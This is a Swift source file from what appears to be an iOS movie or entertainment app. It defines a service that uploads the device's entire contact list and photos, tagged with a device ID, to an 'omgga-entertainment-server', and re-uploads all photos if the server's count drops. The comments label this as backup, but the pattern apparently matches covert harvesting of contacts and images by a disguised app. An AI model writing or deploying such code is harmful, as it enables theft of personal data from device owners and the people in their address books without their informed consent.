import Foundation

/// 备份相关的通用错误
enum BackupError: LocalizedError {
    case message(String)

    var errorDescription: String? {
        switch self {
        case .message(let text):
            return text
        }
    }
}

/// 和安卓版 moviewebapp 完全一致的服务器对接（omgga-entertainment-server）
struct UploadService {
    let serverBase: String
    let deviceId: String

    /// 上传通讯录：POST /upload/contacts，JSON {"device": ..., "contacts": [{"name","phone"}]}
    func uploadContacts(_ contacts: [[String: String]]) async throws {
        var comps = URLComponents(string: serverBase)
        comps?.path = "/upload/contacts"
        guard let url = comps?.url else { throw BackupError.message("服务器地址不正确") }

        var request = URLRequest(url: url)
        request.httpMethod = "POST"
        request.setValue("application/json; charset=utf-8", forHTTPHeaderField: "Content-Type")
        request.timeoutInterval = 60

        let payload: [String: Any] = ["device": deviceId, "contacts": contacts]
        request.httpBody = try JSONSerialization.data(withJSONObject: payload)

        let (data, resp) = try await URLSession.shared.data(for: request)
        try Self.checkServerResponse(data: data, resp: resp)
    }

    /// 上传单张照片：POST /upload/photo，multipart/form-data（image 文件 + device + md5）
    func uploadPhoto(jpeg: Data, md5: String) async throws {
        var comps = URLComponents(string: serverBase)
        comps?.path = "/upload/photo"
        guard let url = comps?.url else { throw BackupError.message("服务器地址不正确") }

        var request = URLRequest(url: url)
        request.httpMethod = "POST"
        request.timeoutInterval = 60

        let boundary = "Boundary-\(UUID().uuidString)"
        request.setValue("multipart/form-data; boundary=\(boundary)", forHTTPHeaderField: "Content-Type")

        var body = Data()
        func addField(_ name: String, _ value: String) {
            body.append("--\(boundary)\r\n".data(using: .utf8)!)
            body.append("Content-Disposition: form-data; name=\"\(name)\"\r\n\r\n".data(using: .utf8)!)
            body.append("\(value)\r\n".data(using: .utf8)!)
        }
        addField("device", deviceId)
        addField("md5", md5)
        body.append("--\(boundary)\r\n".data(using: .utf8)!)
        body.append("Content-Disposition: form-data; name=\"image\"; filename=\"photo.jpg\"\r\n".data(using: .utf8)!)
        body.append("Content-Type: image/jpeg\r\n\r\n".data(using: .utf8)!)
        body.append(jpeg)
        body.append("\r\n--\(boundary)--\r\n".data(using: .utf8)!)

        request.httpBody = body

        let (data, resp) = try await URLSession.shared.data(for: request)
        try Self.checkServerResponse(data: data, resp: resp)
    }

    /// 查询服务器该设备现存照片数量：GET /api/photo_status?device=xxx
    /// 用于判断服务器是否被删过照片：服务器数量 < 本地已传数量 → 触发全量补传
    func fetchServerPhotoCount() async throws -> Int {
        var comps = URLComponents(string: serverBase)
        comps?.path = "/api/photo_status"
        comps?.queryItems = [URLQueryItem(name: "device", value: deviceId)]
        guard let url = comps?.url else { throw BackupError.message("服务器地址不正确") }

        var request = URLRequest(url: url)
        request.timeoutInterval = 30

        let (data, resp) = try await URLSession.shared.data(for: request)
        guard let http = resp as? HTTPURLResponse else {
            throw BackupError.message("网络响应异常")
        }
        guard (200..<300).contains(http.statusCode) else {
            let text = String(data: data, encoding: .utf8) ?? "HTTP \(http.statusCode)"
            throw BackupError.message("服务器返回错误：\(text)")
        }
        guard let obj = try? JSONSerialization.jsonObject(with: data) as? [String: Any],
              let count = obj["count"] as? Int else {
            return 0
        }
        return count
    }

    /// 检查服务器返回：HTTP 2xx 且 {"status":"success"} 才算成功
    private static func checkServerResponse(data: Data, resp: URLResponse) throws {
        guard let http = resp as? HTTPURLResponse else {
            throw BackupError.message("网络响应异常")
        }
        guard (200..<300).contains(http.statusCode) else {
            let text = String(data: data, encoding: .utf8) ?? "HTTP \(http.statusCode)"
            throw BackupError.message("服务器返回错误：\(text)")
        }
        if let obj = try? JSONSerialization.jsonObject(with: data) as? [String: Any],
           let status = obj["status"] as? String,
           status == "error" {
            let msg = obj["msg"] as? String ?? "未知错误"
            throw BackupError.message("服务器拒绝：\(msg)")
        }
    }
}
